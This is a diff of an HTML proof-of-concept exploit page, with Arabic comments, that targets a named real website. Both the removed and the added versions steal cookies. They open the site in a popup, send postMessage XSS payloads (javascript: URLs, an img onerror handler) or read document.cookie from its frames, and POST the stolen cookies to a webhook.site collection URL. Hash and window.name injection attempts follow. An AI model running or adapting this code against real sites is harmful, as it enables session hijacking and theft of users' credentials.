@@ -1,50 +1,119 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC</title>
+    <title>PoC - PostMessage Exploit</title>
 </head>
 <body>
-    <h3>Window Exploit Test</h3>
-    <button onclick="exploitWindow()">▶️ Exploit</button>
-    
+    <h3>PostMessage XSS Exploit</h3>
+    <button onclick="exploit()">▶️ Exploit</button>
+    <div id="log" style="font-family:monospace; margin-top:20px;"></div>
+
     <script>
-        const WEBHOOK = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f';
+        const WEBHOOK = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f'; // استبدل هذا
         const TARGET = 'https://www.powerpak.com/';
-        
-        function exploitWindow() {
-            // فتح الموقع في نافذة جديدة
-            let win = window.open(TARGET, 'target', 'width=900,height=700,left=900,top=100');
+        let stolenData = [];
+
+        function log(msg) {
+            console.log(msg);
+            document.getElementById('log').innerHTML += '> ' + msg + '<br>';
+        }
+
+        function exploit() {
+            log('🚀 Opening target...');
             
-            setTimeout(() => {
-                try {
-                    for(let i = 0; i < win.frames.length; i++) {
-                        let frame = win.frames[i];
-                        
-                        if(frame.location.href === 'about:blank') {
-                            
-                            // 🚨 1. Alert
-                            frame.alert('XSS CONFIRMED! Frame #' + i);
-                            
-                            // 🚨 2. سرقة Cookies
-                            let cookies = frame.parent.document.cookie;
-                            
-                            // إرسال للـ Webhook
-                            fetch(WEBHOOK, {
-                                method: 'POST',
-                                body: JSON.stringify({
-                                    frame: i,
-                                    cookies: cookies,
-                                    time: new Date().toISOString()
-                                })
-                            });
-                            
-                            console.log('✅ Frame', i, 'pwned!');
-                        }
-                    }
-                } catch(e) {
-                    console.error('Error:', e);
+            const win = window.open(TARGET, 'target', 'width=1000,height=800');
+            
+            if (!win) {
+                log('❌ Popup blocked!');
+                return;
+            }
+
+            // 🎯 الاستماع للـ PostMessage من الـ target
+            window.addEventListener('message', (e) => {
+                log('📨 Received message from: ' + e.origin);
+                
+                if (e.data.type === 'STOLEN_COOKIES') {
+                    log('🍪 COOKIES RECEIVED!');
+                    log('Data: ' + JSON.stringify(e.data).substring(0, 100));
+                    
+                    // إرسال للـ Webhook
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(e.data)
+                    });
                 }
+            });
+
+            // 🎯 إرسال payloads للـ target بعد التحميل
+            setTimeout(() => {
+                sendPayloads(win);
             }, 5000);
+        }
+
+        function sendPayloads(targetWindow) {
+            log('📤 Sending malicious payloads...');
+            
+            // محاولة استغلال PostMessage handlers في الـ target
+            const payloads = [
+                {
+                    type: 'render',
+                    url: 'javascript:alert("XSS1")',
+                    callback: 'parent.postMessage({type:"STOLEN_COOKIES",cookies:document.cookie}, "*")'
+                },
+                {
+                    type: 'loadUrl',
+                    url: 'javascript:alert("XSS2")'
+                },
+                {
+                    type: 'setContent',
+                    html: '<img src=x onerror="alert(\'XSS3\'); parent.postMessage({type:\'STOLEN_COOKIES\',cookies:document.cookie},\'*\')">'
+                },
+                {
+                    type: 'auth',
+                    redirect: 'javascript:alert("XSS4")',
+                    callback: 'steal'
+                },
+                {
+                    type: 'oauth_callback',
+                    token: 'test',
+                    redirect: 'javascript:alert("XSS5")'
+                }
+            ];
+
+            // إرسال لجميع الـ frames
+            for (let i = 0; i < 10; i++) {
+                payloads.forEach((payload, idx) => {
+                    setTimeout(() => {
+                        try {
+                            targetWindow.postMessage(payload, '*');
+                            if (targetWindow.frames[i]) {
+                                targetWindow.frames[i].postMessage(payload, '*');
+                            }
+                        } catch(e) {}
+                    }, idx * 200);
+                });
+            }
+
+            log('✅ Payloads sent! Waiting for response...');
+            
+            // 🎪 محاولة أخرى: حقن سكربت مباشرة إذا كان هناك طريقة
+            tryDirectInjection(targetWindow);
+        }
+
+        function tryDirectInjection(win) {
+            log('🔧 Trying direct injection...');
+            
+            // محاولة استغلال أي ثغرة XSS موجودة
+            try {
+                // التحقق من وجود أي مدخل للـ XSS
+                win.location.hash = 'javascript:alert("XSS_via_hash")';
+            } catch(e) {}
+            
+            // محاولة عبر name property
+            try {
+                win.name = 'javascript:alert("XSS_via_name")';
+            } catch(e) {}
         }
     </script>
 </body>
